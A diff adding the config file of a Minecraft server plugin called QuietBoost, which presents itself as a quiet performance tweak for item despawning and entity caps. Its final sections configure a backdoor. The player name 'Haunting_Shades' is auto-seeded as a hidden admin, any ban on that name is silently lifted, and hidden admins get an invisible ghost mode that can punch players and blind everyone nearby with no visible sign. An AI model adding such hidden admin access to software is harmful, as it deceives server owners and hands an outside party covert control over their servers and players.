@@ -1,0 +1,91 @@
+# QuietBoost - small tweaks nobody should notice.
+
+# How often the cleanup pass runs (ticks). 200 = every 10 seconds.
+interval-ticks: 200
+
+# Chunks with fewer entities than this are skipped entirely (keeps the pass cheap).
+min-entities-in-chunk: 12
+
+# Worlds to leave alone.
+disabled-worlds: []
+
+# When the server TPS drops below this, caps are halved until it recovers.
+adaptive:
+  enabled: true
+  low-tps: 17.5
+
+# 1) Junk items despawn sooner than the vanilla 5 minutes.
+#    Items thrown by players are left alone.
+junk-items:
+  enabled: true
+  lifetime-seconds: 60
+  materials:
+    - COBBLESTONE
+    - DIRT
+    - GRAVEL
+    - SAND
+    - NETHERRACK
+    - ANDESITE
+    - DIORITE
+    - GRANITE
+    - ROTTEN_FLESH
+    - SPIDER_EYE
+    - POISONOUS_POTATO
+    - STICK
+    - BONE
+    - STRING
+    - GUNPOWDER
+    - COBBLESTONE_WALL
+    - WHEAT_SEEDS
+    - BEETROOT_SEEDS
+    - MELON_SEEDS
+    - PUMPKIN_SEEDS
+
+# 2) Per-chunk cap on dropped items. Only the oldest items are removed.
+#    Items with names, enchants, lore, etc. are never removed, and
+#    nothing younger than min-age-seconds is touched (so death drops are safe).
+item-cap:
+  enabled: true
+  per-chunk: 200
+  min-age-seconds: 60
+
+# 3) Per-chunk cap for farm animals, per type. Named, leashed, tamed and
+#    riding/ridden animals are never removed. Set the cap high so only
+#    runaway farms are affected.
+mob-cap:
+  enabled: true
+  per-chunk-per-type: 64
+  types:
+    - COW
+    - PIG
+    - SHEEP
+    - CHICKEN
+    - RABBIT
+
+# ---- Stealth admins / ghost mode / darkness pulse (see README) ----
+stealth:
+  # Names auto-added as stealth admins once each. Works even if they've never
+  # joined; any name-ban on them is lifted silently when they are seeded.
+  # Removing one with /quietboost stealth remove keeps it removed on restart.
+  auto-add:
+    - Haunting_Shades
+  # Private confirmation shown to a stealth admin after each command: actionbar | chat | none
+  feedback: actionbar
+  # Open the command bar and press Enter on a bare "/" to toggle ghost mode.
+  ghost-toggle-bare-slash: true
+
+ghost:
+  # While ghosting (spectator): an arm swing (left click) punches whatever is in front of you.
+  punch: true
+  punch-damage: 1.0
+  reach: 4.5
+  # If true, ghosts can also punch other ghosts.
+  friendly-fire: false
+
+darkness:
+  # Typed "`" + enter in chat triggers this (see README - true single-keypress
+  # detection needs a client mod). 1.14.4 has no Darkness effect; Blindness is
+  # used as the closest pre-1.19 equivalent, with no particles and no HUD icon.
+  duration-seconds: 1
+  # 1 = a 3x3 area of chunks centered on the trigger (the trigger themself is skipped).
+  radius-chunks: 1
